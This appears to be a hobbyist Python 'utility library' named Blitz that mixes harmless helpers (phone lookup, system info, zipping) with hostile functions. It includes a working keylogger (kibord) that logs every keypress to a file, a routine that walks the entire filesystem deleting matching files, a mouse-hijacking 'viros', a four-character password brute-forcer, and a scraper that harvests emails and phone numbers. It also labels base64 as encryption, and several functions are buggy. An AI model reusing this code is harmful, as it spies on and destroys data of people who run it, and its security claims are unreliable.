import os


     
from phonenumbers import parse
from phonenumbers import geocoder
from phonenumbers import carrier
import base64
import pyautogui as p
import random
import time
import string
import requests
from bs4 import BeautifulSoup
import re
import socket
import subprocess
import zipfile
import platform
import requests
import psutil
import rotatescreen as RS
from pynput import keyboard


      
     



#
text = """Hello, welcome to the blitz library. this library is to make your programming essier.   
name library:  Blitz
version librery:  0.0.1

"""
def type_out(text, delay=0.03):
      for char in text:
            print(char, end="",flush=True)
            time.sleep(delay)
def icone(icon = True):
      if icon == True:
            type_out(text)
      elif icon == False:
            return "  "
         
            
      
def number(phonenumber):
      """number(+989941260560)"""
      number = parse(phonenumber)
      return carrier.name_for_number(number, "en")
    
def contry(phonnumber):
      """number(+989941260512)"""
      number = parse(phonnumber)
      return geocoder.description_for_number(number, "en")

def pasword(text):
      """pasword("print("kasra")")"""
      code = text
      encrypted_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
      return encrypted_code
      
def paser(ramz):
      """paser("cHJpbnQoImthc3JhIik=") . == kasra"""
      encrypted_code = ramz
      decoded_code = base64.b64decode(encrypted_code).decode('utf-8')
      return decoded_code

def viros(number):
      """viros(number)= viros(25)"""
      for i in range(number):
            x = random.randint(900, 1500)
            y = random.randint(400, 800)
            p.moveTo(x, y)
            time.sleep(0.2)
      
      
def delte_file(filename):
      """is delte file . = delte_file(name file)"""
      for root, dirs, files in os.walk("/"):
            if filename in files:
                  file_path = os.path.join(root, filename)
                  try:
                        os.remove(file_path)
                  except:
                        pass
                        


      
      
def ramz_4(adress):
      """print(password). = ramz_4(adres file or password)"""
      d = f"{adress}"
      real_password = d
      letter = string.ascii_lowercase+string.digits+"!"+"@"+"#"+"$"+"%"+"^"+"&"+"*"+"_"+"+"+"|"+"-"+"("+")"+"/"+"="+"`"+":"+"."+">"+"<"+";"+"_"+","+"?"+"`"+" "+"A"+"B"+"C"+"D"+"E"+"F"+"J"+'I'+'G'+'K'+"L"+"M"+"N"+"O"+"Q"+"U"+"R"+"S"+"T"+"U"+"V"+"W"+"X"+"Y"+"Z"
      found = False
      for i in letter:
            for j in letter:
                  for k in letter:
                        for r in letter:
                              guess = i+k+j+r
                              if guess ==real_password:
                                    return f"password: {guess}"
                                    found = True
                                    break
                        if found == True:
                              break
                  if found == True:
                        break
            if found == True:
                  break


def lockpi(folder_path, variable_name):
    """
    Searches for a specified variable within all readable text files in a given folder.

    Args:
        folder_path (str): The path to the folder to search.
        variable_name (str): The name of the variable to search for.

    Returns:
        list: A list of tuples, where each tuple contains the file path and the matching line
              where the variable is found.  Returns an empty list if the variable is not found.
    """
    variable_addresses = []

    # Traverse through all files in the given folder
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for filename in filenames:
            # Create the full path to the file
            file_path = os.path.join(dirpath, filename)
            try:
                # Open the file and read its content
                with open(file_path, 'r', encoding='utf-8') as file:
                    content = file.read()

                    # Use regex to find all occurrences of the variable
                    pattern = r'\b' + re.escape(variable_name) + r'\b\s*=\s*.*'
                    matches = re.findall(pattern, content)

                    if matches:
                        for match in matches:
                            variable_addresses.append((file_path, match))
            except (IOError, UnicodeDecodeError):
                # Handle files that cannot be read (e.g., binary files)
                continue

    return variable_addresses
    for file_path, match in results:
            print(f"Found in {file_path}: {match}")



def py_exe(adres,name):
      """py_exe(adress file, name file)"""
      try:
            adres = f"cd {adres}"
            command = f"pyinstaller --onefile {name}"
            os.system(adres)
            os.system(command)
      except Exception as e:
            print(e)


def zip_folder(folder_path, zip_file_name):
      """
folder_to_zip = "project"
output_zip_file = "project.zip" 
zip_folder(folder_to_zip, output_zip_file)"""
      with zipfile.ZipFile(zip_file_name, 'w', zipfile. ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                  for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path. relpath(file_path, folder_path))



def name_os():
      system = platform.system()
      if system == "Windows":
            os_name = "Windows"
      elif system == "Linux":
            os_name = "Linux"
      elif system == "Drawin":
            os_name = "macOS"
      else:
            os_name = f"Unknown:  {system}"
      return os_name

def myip():
      try:
            response = requests.get("https://api.ipify.org")
            ip = response.text.strip()
            return response.text
            print(response.text)
      except:
            print("error in ip make sure your internet is connected")
      


def cpu_os():
      print("CPU:")
      print(f"  Physical cores: {psutil.cpu_count(logical=False)}")
      print(f"  Total cores: {psutil.cpu_count(logical=True)}")
      print(f"  CPU frequency: {psutil.cpu_freq().current} MHz")

def ram_os():
      ram = psutil.virtual_memory()
      print("RAM:")
      print(f"  Total RAM: {ram.total / (1024**3):.2f} GB")
      print(f"  Available RAM: {ram.available / (1024**3):.2f} GB")
      print(f"  Used RAM: {ram.used / (1024**3):.2f} GB")

def disk_os():
      print("Disk:")
      disk = psutil.disk_usage('/')
      print(f"  Total disk space: {disk.total / (1024**3):.2f} GB")
      print(f"  Used disk space: {disk.used / (1024**3):.2f} GB")
      print(f"  Free disk space: {disk.free / (1024**3):.2f} GB")
def graphics_os():
      print("Graphics Card:")
      try:
            if os.name == 'nt':
                  output = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode()
                  print(output.strip())
    
            else:
                  output = subprocess.check_output("lspci | grep VGA", shell=True).decode()
                  print(output.strip())
      except FileNotFoundError:
            print("  N/A (Command not found)")
      except subprocess.CalledProcessError:
            print("  N/A (Error executing command)")
      except:
            print("  N/A (Operating system not supported)")       
            
            
            
def extract_site(url):
      print(f"processing site {url}")
      try:
        # ارسال درخواست GET به URL
            response = requests.get(url, timeout=10) # timeout برای جلوگیری از گیر کردن نامحدود
            response.raise_for_status() # اگر درخواست موفقیت آمیز نبود (مثلاً خطای 404)، خطا ایجاد می‌کند

        # تجزیه محتوای HTML با BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

        # ۱. استخراج عنوان سایت
            title_tag = soup.find('title')
            title = title_tag.text.strip() if title_tag else "site title not found."
            print(f"\n[+] title site: {title}")

        # ۲. استخراج تمام لینک‌ها
            links = soup.find_all('a')
            extracted_links = []
            print("\n[+] links available on the site:")
            if links:
                  for link in links:
                        href = link.get('href')
                        text = link.text.strip()
                        if href: # اطمینان از اینکه href خالی نیست
                    # برای اطمینان از اینکه لینک‌ها کامل هستند (نسبت به مبدأ نباشند)
                              full_url = requests.compat.urljoin(url, href)
                              extracted_links.append({'text': text, 'url': full_url})
                    # نمایش مختصر لینک‌ها
                              if len(extracted_links) <= 10: # نمایش فقط ۱۰ لینک اول برای جلوگیری از شلوغی
                                    print(f"  - text: {text if text else 'no text'} | adress: {full_url}")
                  if len(links) > 10:
                        print(f"  ...  and{len(links) - 10} another lik.")
            else:
                  print(" nolimks found.")

        # ۳. استخراج اطلاعات تماس (شماره تلفن و ایمیل) با استفاده از Regular Expressions
        # الگوی ساده برای شماره تلفن (ممکن است نیاز به تنظیم دقیق‌تر داشته باشد)
            phone_pattern = re.compile(r'(\+?[\d\s\-\(\)]{10,})') # الگوی نسبتاً کلی برای شماره تلفن
        # الگوی ساده برای ایمیل
            email_pattern = re.compile(r'[\w\.-]+@[\w\.-]+\.\w+') # الگوی استاندارد ایمیل

            found_phones = phone_pattern.findall(response.text)
            found_emails = email_pattern.findall(response.text)

            print("\n[+] contact information found:")
            if found_phones:      
                  print("  phone numbers:")
            # حذف موارد تکراری و نمایش
                  unique_phones = sorted(list(set(found_phones)))
                  for phone in unique_phones:
                        print(f"    - {phone.strip()}")
            else:
                  print("  phone number not found")

            if found_emails:
                  print("  adress email:")
            # حذف موارد تکراری و نمایش
                  unique_emails = sorted(list(set(found_emails)))
                  for email in unique_emails:
                        print(f"    - {email.strip()}")
            else:
                  print("  adress email not found")

      except requests.exceptions.RequestException as e:
            print(f"\n[-] air when accessing {url} it happend. {e}")
      except Exception as e:
            print(f"\n[-]an unexpected error occurred {e}")


def internet():
      hgh = "www.google.com"
      try:
            host=socket.gethostbyname(hgh)
            socket.create_connection((hgh, 80))
            return "connect"
      except:
            return "no connect"
            if cone == "connect":
                  return "connect"
            elif cone == "no connect":
                  return "no connect"
            
dictionry = {
      'key.caps_lock' : "caps loak",
      'key.shift' : "shift chap",
      'key.ctrl_l' : "ctrl chap",
      'key.shift_r' : "shift chap",
      'key.ctrl_r' : "ctrl rast",
      'key.ctrl_r' : "ctrl rast",
      'key.tab' : "tab",
      'key.esc' : "esc",
      'key.cmd' : "fn or windows logo(cmd)",
      'key.alt_l' : "alt chap",
      'key.apace' : "space",
      'key.alt_gr' : "alt rast",
      'key.menu' : "klid meun",
      'key.left' : "flesh chap",
      'key.down' : "flesh payin",
      'key.right' : "flesh rast",
      'key.up' : "flash bala",
      'key.page_up' : "page up",
      'key.page_down' : "page down",
      'key.home' : "home",
      'key.end' : "end",
      'key.insert' : "insert",
      'key.delete' : "delete",
      'key.print_screen' : "print screen",
      'key.num_lock' : "num lock",
      'key.enter' : "enter",
      'key.f1' : "f1",
      'key.f2' : "f2",
      'key.f3' : "f3",
      'key.f4' : "f4",
      'key.f5' : "f5",
      'key.f6' : "f6",
      'key.f7' : "f7",
      'key.f8' : "f8",
      'key.f9' : "f9",
      'key.f10' : "f10",
      'key.f11' : "f11",
      'key.f12' : "f12",
      'key.backspace' : "backspace",
      '<96>' : "0",
      '<97>' : "1",
      '<98>' : "2",
      '<99>' : "3",
      '<100>' : "4",
      '<101>' : "5",
      '<102>' : "6",
      '<103>' : "7",
      '<104>' : "8",
      '<105>' : "9",
}
def kibord():
      def pressed(key):
            filename = "kiboard.txt"
            file = open(filename, "a")
            try:
                  file.write(str(dictionry[str(key)]).replace("'", ''))
            except:
                  file.write(str(key).replace("'", ''))
                  file.write('\n')
                  file.close()
      with open("kiboard.txt", "w")as file:
            file.close()
      with keyboard.Listener(on_press=pressed)as listener:
            listener.join()


                  
            
      